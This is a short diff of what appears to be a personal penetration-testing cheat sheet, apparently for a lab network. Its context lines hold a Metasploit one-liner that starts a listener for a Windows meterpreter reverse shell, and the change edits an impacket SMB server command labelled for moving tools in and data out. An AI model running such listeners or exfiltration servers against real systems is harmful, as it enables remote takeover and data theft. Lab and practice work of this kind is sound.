@@ -49,4 +49,4 @@ paste in your shell, profit
 `sudo msfconsole -x "use exploits/multi/handler; set lhost 10.10.14.14; set lport 443; set payload windows/meterpreter/reverse_tcp; exploit"`
 
 ## Start SMB for infil/exfil:  
-`$ sudo impacket-smbserver GUEST /home/kymb0/Desktop/backup/offshore/toolz`
+`$ sudo impacket-smbserver -smb2support GUEST /home/kymb0/Desktop/backup/offshore/toolz`
